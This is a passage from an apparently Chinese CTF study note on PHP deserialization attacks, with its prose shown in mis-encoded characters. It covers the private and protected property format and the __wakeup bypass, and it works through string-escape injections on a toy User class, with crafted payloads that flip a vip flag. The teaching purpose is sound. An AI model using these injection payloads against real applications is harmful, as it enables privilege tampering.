<p>like this: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;<span class="comment">//è¿™é‡Œæ˜¯privateå±æ€§è¢«åºåˆ—åŒ–</span></span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;%00*%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;%00*%00cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;<span class="comment">//è¿™é‡Œæ˜¯protectedå±æ€§è¢«åºåˆ—åŒ–</span></span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„ï¼š<code>var</code> ä¸º <code>public</code> çš„åˆ«åã€‚phpä¸­å¿…é¡»ä½¿ç”¨è¿™ä¸‰ä¸ªä¿®é¥°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ <code>var</code> ä»£æ›¿ <code>pubic</code>ã€‚</p>
<p>å¦‚æœä¸æƒ³å¤åˆ¶çš„æ—¶å€™æ²¡å¤åˆ¶åˆ°ä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥å°†å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œurlç¼–ç ï¼[[MRCTF2020 Ezpop]]</p>
<h1 id="ç»•è¿‡-__wakeup-å‡½æ•°">4 ç»•è¿‡ __wakeup() å‡½æ•°</h1>
<p>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚è¯¥æ–¹æ³•å’Œ__sleep()ç›¸åï¼Œå‰è€…ä½¿ç”¨serialize()æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œåè€…å½“ä½¿ç”¨ unserialize() æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚</p>
<p>è¯¥æ–¹æ³•æœ‰ä¸€ä¸ªæ¼æ´(CVE-2016-7124)ï¼Œåªéœ€è¦åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡æ‰§è¡Œã€‚</p>
<h1 id="å­—ç¬¦ä¸²é€ƒé€¸">5 å­—ç¬¦ä¸²é€ƒé€¸</h1>
<p>åŸç†ï¼šå…ˆå°†å¯¹è±¡åºåˆ—åŒ–ï¼Œç„¶åå°†å¯¹è±¡ä¸­çš„å­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œæœ€åå†è¿›è¡Œååºåˆ—åŒ–ã€‚è¿™ä¸ªæ—¶å€™å°±æœ‰å¯èƒ½ä¼šäº§ç”ŸPHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„æ¼æ´ã€‚</p>
<p>æœ‰ä¸¤ç§æƒ…å†µï¼š</p>
<ol type="1">
<li>è¿‡æ»¤åå­—ç¬¦å˜å¤š</li>
<li>è¿‡æ»¤åå­—ç¬¦å˜å°‘</li>
</ol>
<h2 id="è¿‡æ»¤åå­—ç¬¦å˜å¤š">5.1 è¿‡æ»¤åå­—ç¬¦å˜å¤š</h2>
<p>å‡è®¾å®šä¹‰å¦‚ä¸‹ä¸€ä¸ªç±»ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶å¦‚æœæœ‰ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œå¹¶å°†ååºåˆ—åçš„å­—ç¬¦ä¸²å¸¦å…¥æ‰§è¡Œï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„å¯¹æ¯”ä¸Šé¢ä¸¤è€…çš„è¾“å‡ºç»“æœï¼Œä¼šå‘ç° <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:5:&quot;admin&quot;;</span><br><span class="line">s:5:&quot;hacker&quot;;</span><br><span class="line"></span><br><span class="line">æ˜æ˜¾ä¸‹é¢hackeré•¿åº¦ä¸º6ï¼Œå¤§äº5ï¼ŒæŒ‰ç†æ¥è¯´è¿™æ˜¯ä¸åº”è¯¥çš„ã€‚è¿™å°±æ˜¯æ¼æ´æ‰€åœ¨</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ—¶å€™<code>admin</code>ï¼ˆè¢«è¿‡æ»¤çš„ï¼‰å°±æ˜¯æˆ‘ä»¬çš„å¯æ§å˜é‡ï¼Œå‡è®¾æˆ‘ä»¬éœ€è¦æŠŠvipå±æ€§å˜ä¸º1ã€‚ å¯¹æ¯”ç°æœ‰çš„å­ä¸²å’Œç›®æ ‡å­ä¸²(éƒ¨åˆ†æ¯”è¾ƒ)ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125; // ç°æœ‰</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; // ç›®æ ‡</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬å¯ä»¥è¦åœ¨adminè¿™ä¸ªå¯æ§å˜é‡çš„ä½ç½®ï¼Œ<strong>æ³¨å…¥ç›®æ ‡å­ä¸²</strong></p>
<p>è®¡ç®—ç›®æ ‡å­—ä¸²çš„é•¿åº¦ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125; //é•¿åº¦42</span><br></pre></td></tr></table></figure></p>
<p>ä¹Ÿå°±æ˜¯éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º42ï¼Œæ¯æ¬¡adminè¿‡æ»¤åéƒ½å˜ä¸ºhackerï¼Œä¹Ÿå°±æ˜¯æ¯æœ‰ä¸€ä¸ªadminï¼Œè¿‡æ»¤åé•¿åº¦éƒ½ä¼šå¢åŠ 1ã€‚åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬è¾“å…¥42ä¸ªadminï¼Œè¿™æ ·å­è¿‡æ»¤åå­—ç¬¦ä¸²é•¿åº¦å°±ä¼šå¢åŠ 42ï¼Œå› æ­¤å¯æ§å˜é‡ä¿®æ”¹ä¸ºï¼š <code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"123";s:3:"vip";i:1;&#125;</code></p>
<p>å®Œæ•´ç¨‹åºå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hacker&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_ser_filter</span> = filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">252</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:3:&quot;</span><span class="number">111</span><span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æœ‰42ä¸ªhackerï¼Œé•¿åº¦æ­£å¥½ä¸252å¯¹åº”ã€‚</p>
<blockquote>
<p>ååºåˆ—åŒ–åï¼Œå¤šä½™çš„å­—ä¸²ä¼šè¢«æŠ›å¼ƒã€‚è€Œpasswordï¼ˆä¸åœ¨usernameé‡Œé¢çš„ï¼‰å°±ä¼šè¢«æŠ›å¼ƒã€‚</p>
</blockquote>
<p>å°†è¿™ä¸ªç»“æœååºåˆ—åŒ–å¾—åˆ°å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(User)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(252) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;vip&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„çœ‹å¯†ç ä¸æˆ‘ä»¬è¾“å…¥çš„passwordä¸åŒï¼Œè€Œæ˜¯ä¸usernameé‡Œé¢çš„passwordç›¸åŒï¼›å¹¶ä¸”ï¼Œvipå­—æ®µä¹Ÿä¿®æ”¹ä¸º1ã€‚</p>
<blockquote>
<p>è§£é‡Šï¼šusername=adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:3:"111";s:3:"vip";i:1;} é•¿åº¦ä¸º252ï¼›è€Œusername=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker é•¿åº¦ä¹Ÿæ˜¯252 å› æ­¤ç³»ç»Ÿå°†æ‰€æœ‰çš„hackæ¥æ”¶ä¸ºusernameä¹‹åæ­£å¥½è¾¾åˆ°äº†usernameçš„é•¿åº¦ï¼Œæ‰€ä»¥ä¼šå°†";s:8:"password";s:3:"111";s:3:"vip";i:1;}æ”¾åˆ°passwordå­—æ®µã€‚æ³¨æ„ï¼Œè¿™é‡Œå‰é¢çš„<strong><code>";</code>æ­£å¥½å°†usernameé—­åˆ</strong>ï¼Œç„¶ååé¢çš„s:8:"password";s:3:"111";s:3:"vip";i:1;}<strong>æ­£å¥½åˆç¬¦åˆpasswordå’Œvipå±æ€§çš„ååºåˆ—åŒ–è¦æ±‚</strong>ï¼Œå°±ä¼šè¢«å½“ä½œpasswordå’Œvipå±æ€§è¿›è¡Œååºåˆ—åŒ–ï¼Œ<strong><code>;</code>å°†vipå±æ€§é—­åˆ</strong>ï¼Œ<strong><code>&#125;</code>å°†åºåˆ—åŒ–åçš„å­ä¸²é—­åˆ</strong>ï¼Œè¿™æ ·å­å°±å½¢æˆä¸€ä¸ªå®Œæ•´çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œè€Œåé¢çš„"111"å°±ä¼šè¢«æŠ›å¼ƒã€‚</p>
</blockquote>
<p>æ³¨æ„ï¼šä¸€å®šè¦é—­åˆï¼šå±æ€§ä¹‹é—´çš„é—­åˆç”¨<code>;</code>ï¼Œé—­åˆåºåˆ—åŒ–å¯¹è±¡ç”¨çš„æ˜¯<code>&#125;</code>ã€‚</p>
<h2 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘">5.2 è¿‡æ»¤åå­—ç¬¦å˜å°‘</h2>
<p>ä¸»ä½“å’Œä¸Šé¢ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯è¿‡æ»¤å‡½æ•°å˜ä¸ºå¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å¯¹æ¯”è¿‡æ»¤å‰åçš„å­—ç¬¦ä¸²ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:3:&quot;111&quot;;s:3:&quot;vip&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºè¿‡æ»¤çš„æ—¶å€™ï¼Œå°†<strong>5</strong>ä¸ªå­—ç¬¦åˆ å‡ä¸ºäº†<strong>4</strong>ä¸ªï¼Œæ‰€ä»¥å’Œä¸Šé¢å­—ç¬¦å˜å¤šçš„æƒ…å†µç›¸åï¼Œéšç€åŠ å…¥çš„<strong>admin</strong>çš„æ•°é‡å¢å¤šï¼Œ<strong>ç°æœ‰å­ä¸²</strong>åé¢ä¼šç¼©è¿›æ¥ã€‚</p>
<p>è®¡ç®—ä»¥ä¸‹ç›®æ ‡å­—ä¸²é•¿åº¦ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;  </span><br><span class="line">//é•¿åº¦42</span><br></pre></td></tr></table></figure></p>
<p>è®¡ç®—åˆ°<strong>ä¸‹ä¸€ä¸ªå¯æ§å˜é‡</strong>ï¼ˆè¿™é‡Œæ˜¯passwordï¼‰çš„å­—ç¬¦ä¸²ï¼ˆç§°ä¸ºç¼©è¿›ä¸²ï¼‰é•¿åº¦ï¼š ^184190 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:3:&quot;</span><br><span class="line">// é•¿åº¦ä¸º22</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºæ¯æ¬¡è¿‡æ»¤éƒ½ä¼šå‡å°‘ä¸€ä¸ªå­—ç¬¦ï¼Œå› æ­¤å‡å°‘22ä¸ªå­—ç¬¦å°±èƒ½å°†ä¸Šé¢çš„ç¼©è¿›ä¸²ç¼©è¿›usernameå±æ€§é‡Œé¢ ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œæ¼”ç¤ºæ‰€ä»¥æ¯æ¬¡å°±å‡å°‘ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯èƒ½ä¸€æ¬¡å‡å°‘3ä¸ªå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶éœ€è¦8ä¸ªï¼Œä¹Ÿå°±æ˜¯ç¼©çŸ­äº†24ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ—¶å€™å¤šè¾“å…¥2ä¸ªå­—ç¬¦ï¼Œè®©å…¶ç¼©è¿›åˆ°å‰ä¸€ä¸ªå±æ€§å³å¯ï¼‰ ^8660cb</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœå¦‚ä¸‹ï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>æ³¨æ„</strong>ï¼šPHPååºåˆ—åŒ–çš„æœºåˆ¶æ˜¯ï¼Œæ¯”å¦‚å¦‚æœå‰é¢æ˜¯è§„å®šäº†æœ‰10ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åªè¯»åˆ°äº†9ä¸ªå°±åˆ°äº†åŒå¼•å·ï¼Œè¿™ä¸ªæ—¶å€™PHPä¼šæŠŠåŒå¼•å·å½“åšç¬¬10ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸æ ¹æ®åŒå¼•å·åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å·²ç»ç»“æŸï¼Œè€Œæ˜¯æ ¹æ®å‰é¢è§„å®šçš„æ•°é‡æ¥è¯»å–å­—ç¬¦ä¸²ã€‚<strong>æ‰€ä»¥éœ€è¦é—­åˆï¼é—­åˆï¼é—­åˆï¼</strong></p>
<p>åˆ†æï¼šè¿™é‡ŒsæŒ‡å®šçš„é•¿åº¦æ˜¯110ï¼Œè€Œä»ç¬¬ä¸€ä¸ªåŒå¼•å·å¼€å§‹çš„105ä¸ªå­—ç¬¦ä¸ºï¼š<code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:3:"</code>ï¼Œè¿™å­—ç¬¦ä¸²ä¼šè¢«å½“ä½œusernameå±æ€§å€¼ã€‚</p>
<p><strong>é‡ç‚¹</strong>ï¼šæ‰€ä»¥<code>111</code>å°±æˆä¸ºäº†å¯æ§å˜é‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„passwordå˜ä¸ºäº†å¯æ§å˜é‡ã€‚å°†111æ›¿æ¢ä¸ºæˆ‘ä»¬çš„ç›®æ ‡å­—ä¸²å³å¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>, <span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$uname</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>, <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:3:&quot;vip&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_ser</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> filter(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="comment">//var_dump(unserialize(filter($a_ser)));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ç»“æœä¸ºï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">42</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;vip&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>vip<span class="string">&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>ä¼šå‘ç°æŠ¥é”™äº†ï¼Œå…¶å®è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ï¼š</p>
